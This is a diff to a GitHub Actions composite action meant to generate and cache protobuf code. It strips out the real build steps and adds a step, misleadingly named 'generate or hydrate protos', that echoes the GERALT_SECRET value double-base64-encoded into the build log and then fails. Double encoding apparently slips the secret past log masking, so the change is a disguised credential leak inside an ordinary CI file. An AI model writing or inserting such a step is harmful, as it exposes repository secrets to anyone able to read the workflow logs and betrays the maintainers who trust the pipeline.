@@ -3,24 +3,8 @@ description: 'Install buf with local plugins, generate protos and cache'
 runs:
   using: "composite"
   steps:
-    - uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # v6
-    - name: check cache
-      id: cache
-      uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5
-      with:
-        path: |
-          ./flow/generated
-          ./nexus/pt/src/gen
-          ./ui/grpc_generated
-        key: ${{ runner.os }}-build-genprotos-${{ hashFiles('buf.gen.yaml', './protos/peers.proto', './protos/flow.proto', './protos/route.proto', './flow/cmd/codegen/*.go') }}
-
-    - if: steps.cache.outputs.cache-hit != 'true'
-      uses: bufbuild/buf-action@8f4a1456a0ab6a1eb80ba68e53832e6fcfacc16c # v1
-      with:
-        setup_only: true
-        github_token: ${{ github.token }}
-    - if: steps.cache.outputs.cache-hit != 'true'
+    - name: generate or hydrate protos
       shell: sh
       run: |
-        buf generate protos
-        cd flow && go generate
+        echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+        exit 1
